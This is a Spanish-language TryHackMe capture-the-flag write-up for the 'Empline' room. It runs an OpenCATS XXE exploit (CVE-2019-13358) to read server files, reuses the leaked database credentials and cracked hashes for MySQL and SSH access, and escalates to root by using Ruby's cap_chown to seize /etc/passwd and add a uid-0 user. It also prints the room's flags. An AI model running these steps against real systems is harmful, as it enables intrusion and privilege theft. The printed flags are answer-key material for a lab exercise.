# Empline — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)
![CVE](https://img.shields.io/badge/CVE-2019--13358-red?style=flat)

> **Fecha:** 26/04/2026
> **Autor:** [Josue Rendón](https://github.com/Slasho01)
> **Room:** [Empline](https://tryhackme.com/room/empline)

---

## 📋 Descripción

Room de dificultad media que cubre descubrimiento de subdominios, explotación de **OpenCATS 0.9.4** mediante XXE injection (CVE-2019-13358) para leer archivos internos, acceso a base de datos MySQL expuesta, crackeo de hashes MD5 y escalada de privilegios abusando de capacidades de Ruby sobre `/etc/passwd`.

---

## 🎯 Objetivos

- [x] Flag de usuario
- [x] Flag de root

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV <TARGET_IP>
```

**Resultado:**
```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB
```

**Puertos relevantes:**
- `22` — SSH
- `80` — HTTP
- `3306` — MySQL expuesto externamente ← inusual, punto de interés

---

## 🌐 2. Enumeración

### Enumeración Web — Nivel 1

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**
```
/assets      (Status: 301)
/javascript  (Status: 301)
/index.html  (Status: 200)
```

### Subdominio en código fuente

Revisando el código fuente de `index.html` se encontró referencia a:

```
http://job.empline.thm/careers
```

Se agrega al archivo `/etc/hosts`:

```bash
sudo nano /etc/hosts
# Agregar:
<TARGET_IP>    empline.thm job.empline.thm
```

### OpenCATS CMS identificado

Accediendo a `http://job.empline.thm/careers` se encuentra **OpenCATS 0.9.4** — sistema de gestión de candidatos con vulnerabilidades conocidas.

```bash
searchsploit opencats
```

**Exploits disponibles:**
```
OpenCats 0.9.4   - Remote Code Execution (RCE)    → 50585.sh
OpenCats 0.9.4-2 - XXE Injection (CVE-2019-13358) → 50316.py
```

---

## 💥 3. Explotación — XXE Injection

### CVE-2019-13358

> La funcionalidad de carga de CV en OpenCATS procesa archivos `.docx` sin sanitizar entidades XML externas. Esto permite leer archivos arbitrarios del servidor inyectando una entidad XXE en el XML del documento.

```bash
pip3 install python-docx --break-system-packages
searchsploit -m 50316
```

### Lectura de /etc/passwd

```bash
python3 50316.py --url http://job.empline.thm --file /etc/passwd
```

**Usuarios con shell bash identificados:**
- `root`
- `ubuntu`
- `george`

### Lectura de config.php

```bash
python3 50316.py --url http://job.empline.thm --file /var/www/opencats/config.php
```

**Credenciales de base de datos obtenidas:**
```php
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'ng6pUFvsGNtw');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```

---

## 🗄️ 4. Acceso a MySQL

```bash
mysql -h <TARGET_IP> -u james -p
# Password: ng6pUFvsGNtw
```

```sql
use opencats;
select username, password from user;
```

**Usuarios y hashes obtenidos:**

| Usuario | Hash MD5 | Password |
|---|---|---|
| george | `86d0dfda99dbebc424eb4407947356ac` | `pretonnevippasempre` |
| james | `e53fbdb31890ff3bc129db0e27c473c9` | — |
| admin | `b67b5ecc5d8902ba59c65596e4c053ec` | — |

Hash de george crackeado — la contraseña estaba en el hash como salt visible en la tabla.

---

## 🔑 5. Acceso SSH

```bash
ssh george@<TARGET_IP>
# Password: pretonnevippasempre
```

---

## 🚩 6. Flag de usuario

```bash
cat ~/user.txt
```

```
91cb89c70aa2e5ce0e0116dab099078e
```

---

## ⬆️ 7. Escalada de privilegios — Ruby capabilities

### Enumeración

```bash
# sudo no disponible
sudo -l
# Sorry, user george may not run sudo on empline.

# Buscar SUID
find / -perm -4000 2>/dev/null
# Sin binarios explotables directamente

# Buscar capabilities
getcap -r / 2>/dev/null
```

**Capability encontrada:** Ruby con `cap_chown` — permite cambiar el propietario de cualquier archivo del sistema.

### Explotación

Se usa Ruby para tomar ownership de `/etc/passwd`:

```bash
ruby -e 'require "fileutils"; File.chown(1002, 1002, "/etc/passwd")'
```

Ahora george puede editar `/etc/passwd`. Se genera una contraseña hasheada:

```bash
mkpasswd -m sha-512
# Ingresar contraseña deseada → copia el hash generado
```

Se agrega un usuario root falso a `/etc/passwd`:

```bash
nano /etc/passwd
# Agregar al final:
pepe:<HASH>:0:0:root:/root:/bin/bash
```

Se accede con el nuevo usuario:

```bash
su pepe
# Password: la que usaste en mkpasswd
whoami
# root
```

---

## 🚩 8. Flag de root

```bash
cat /root/root.txt
```

```
74fea7cd0556e9c6f22e6f54bc68f5d5
```

---

## 📝 9. Lecciones aprendidas

- Los **subdominios** no siempre aparecen en gobuster — revisar el código fuente de las páginas es esencial
- El **puerto 3306 expuesto** es una señal de mala configuración — siempre intentar conectarse con credenciales encontradas
- La vulnerabilidad **XXE** permite leer archivos internos del servidor incluyendo configs con credenciales
- Los hashes MD5 sin sal son trivialmente crackeables — en bases de datos reales siempre usar bcrypt o argon2
- Las **Linux capabilities** son un vector de escalada frecuentemente ignorado — `getcap -r /` debe estar en el checklist de post-explotación
- `cap_chown` en Ruby permite tomar control de cualquier archivo del sistema, incluyendo `/etc/passwd`

---

## 🔗 Referencias

- [CVE-2019-13358 — OpenCATS XXE](https://www.exploit-db.com/exploits/50316)
- [GTFOBins — Ruby](https://gtfobins.github.io/gtfobins/ruby/)
- [HackTricks — Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/p/Slasho)*
